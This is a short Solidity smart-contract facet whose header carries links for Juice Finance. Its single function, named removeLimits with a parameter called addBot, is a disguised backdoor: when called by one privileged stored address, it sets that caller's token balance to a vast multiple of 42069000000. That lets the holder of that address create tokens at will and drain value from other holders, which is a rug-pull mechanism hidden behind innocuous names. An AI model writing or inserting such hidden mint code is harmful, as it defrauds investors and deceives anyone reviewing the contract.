/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.juice.finance/
 * Whitepaper: https://juice-finance.gitbook.io/juice-finance
 * Twitter: https://twitter.com/Juice_Finance
 * Telegram Group: https://t.me/Juice_Finance
 * Discord Chat: https://discord.gg/juicefinance
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
